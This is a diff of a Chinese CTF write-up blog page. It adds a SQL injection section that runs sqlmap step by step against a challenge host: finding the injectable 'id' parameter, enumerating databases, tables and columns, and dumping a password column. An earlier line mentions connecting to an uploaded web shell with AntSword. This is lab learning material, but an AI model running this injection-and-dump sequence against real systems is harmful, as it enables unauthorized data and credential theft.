@@ -404,21 +404,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-09-25
+                    2020-09-28
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5.5k
+                    5.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    20 分
+                    21 分
                 </div>
                 
 
@@ -737,7 +737,41 @@ $_SERVER[“PHP_SELF”]   当前正在执行脚本的文件名</p>
 <img src="/2020/07/05/0xctf/image-20200731124839807.png" alt="image-20200731124839807" style="zoom:50%;">
 <p>应该是成功解析了，这时候将url用蚁剑链接一波，成功链接，然后成功在根目录下找到flag.<span class="github-emoji" style="display:inline;vertical-align:middle;color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f619.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f619.png?v8">😙</span></p>
 <hr>
-<p>未完待续<span class="github-emoji" style="display:inline;vertical-align:middle;color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f638.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f638.png?v8">😸</span></p>
+<h4 id="19-SQL-injection">19.SQL_injection</h4>
+<p>这是一道SQL注入的问题，应该不是很难。之前刷过几道sqllib的题，有空一定好好刷.</p>
+<p>之前我采用的一直是手工注入，这次一开始也是采用的手工注入，但是出了些问题，后来转向sqlmap,由于我之前的sqlmap文件夹貌似又双叒叕被我误删了，这次使用的是kali自带的sqlmap。</p>
+<ul>
+<li>第一步，看是否存在注入点：<code>kcm@kali:~$ sqlmap -u "http://59.110.157.4:30010/?id=1' "</code></li>
+</ul>
+<img src="/2020/07/05/0xctf/image-20200928161245282.png" alt="image-20200928161245282" style="zoom: 67%;">
+<p>提示“id”可能是注入点。</p>
+<ul>
+<li>第二步查看数据库名称：<code>kcm@kali:~$ sqlmap -u"http://59.110.157.4:30010/?id=1' " --dbs</code></li>
+</ul>
+<img src="/2020/07/05/0xctf/image-20200928161505584.png" alt="image-20200928161505584" style="zoom:67%;">
+<p>显示有两个可用的数据库，一个名为 <strong>information_schema</strong>(信息模式？)，另一个名为<strong>user</strong>.</p>
+<ul>
+<li>
+<p>知道了数据库的名称，接下来就是去查看数据库中的表：<code>kcm@kali:~$ sqlmap -u "http://59.110.157.4:30010/?id=1' " -D information_schema --tables</code></p>
+<img src="/2020/07/05/0xctf/image-20200928161847157.png" alt="image-20200928161847157" style="zoom:67%;">
+</li>
+</ul>
+<p>自上而下看了半天，没发现flag字眼，暂且搁置，去另一个库康康：<code>kcm@kali:~$ sqlmap -u "http://59.110.157.4:30010/?id=1' " -D information_schema --tables</code></p>
+<img src="/2020/07/05/0xctf/image-20200928162050230.png" alt="image-20200928162050230" style="zoom:67%;">
+<p>只有简简单单的一个表，很可疑啊，觉得有必要深究一下。</p>
+<ul>
+<li>
+<p>查看user数据库中user表的列信息：<code>kcm@kali:~$ sqlmap -u "http://59.110.157.4:30010/?id=1'" -D user -T user  --columns</code></p>
+<img src="/2020/07/05/0xctf/image-20200928162328554.png" alt="image-20200928162328554" style="zoom:67%;">
+<ul>
+<li>最后查看你想看的东西就行了，falg应该是字符串，所以我首先查看的是password里的东西：<code>kcm@kali:~$ sqlmap -u "http://59.110.157.4:30010/?id=1'" -D user -T user -C password  --dump</code></li>
+</ul>
+<img src="/2020/07/05/0xctf/Users/28294/Desktop/无标题.png" alt="无标题" style="zoom:67%;">
+<p>flag手动打码<span class="github-emoji" style="display:inline;vertical-align:middle;color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f61c.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61c.png?v8">😜</span></p>
+</li>
+</ul>
+<hr>
+<p>未完待续<span class="github-emoji" style="display:inline;vertical-align:middle;color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f61c.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61c.png?v8">😜</span></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -1491,7 +1525,7 @@ $_SERVER[“PHP_SELF”]   当前正在执行脚本的文件名</p>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">9.6k</span>&nbsp;字
+                class="white-color">10k</span>&nbsp;字
             
             
             
@@ -1663,9 +1697,9 @@ $(function () {
     
 
     
-    <script src="/libs/instantpage/instantpage.js" type="module"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-hijiki"},"display":{"position":"left","width":150,"height":300,"hOffset":80,"vOffset":-70},"mobile":{"show":true,"scale":0.5},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/"});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-hijiki"},"display":{"position":"left","width":150,"height":300,"hOffset":80,"vOffset":-70},"mobile":{"show":true,"scale":0.5},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/"});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
 
 </html>
